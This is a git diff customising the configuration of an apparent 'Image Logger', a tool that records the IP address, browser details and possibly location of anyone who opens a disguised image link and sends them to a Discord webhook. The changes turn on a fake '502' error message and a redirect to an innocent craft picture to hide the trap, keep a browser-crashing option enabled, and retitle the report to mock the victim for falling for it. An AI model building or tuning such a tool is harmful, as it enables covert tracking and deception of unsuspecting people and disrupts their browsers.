@@ -19,7 +19,7 @@ config = {
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "color": 0x009900FF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
@@ -27,8 +27,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "Sorry, image cant be accessed right now: Error Code 502", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://iheartcraftythings.com/wp-content/uploads/2021/11/6-108.jpg" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -146,7 +146,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**SOMEONE ACTUALLY FELL FOR IT 😂🤣🤦‍♂️**
 
 **Endpoint:** `{endpoint}`
             
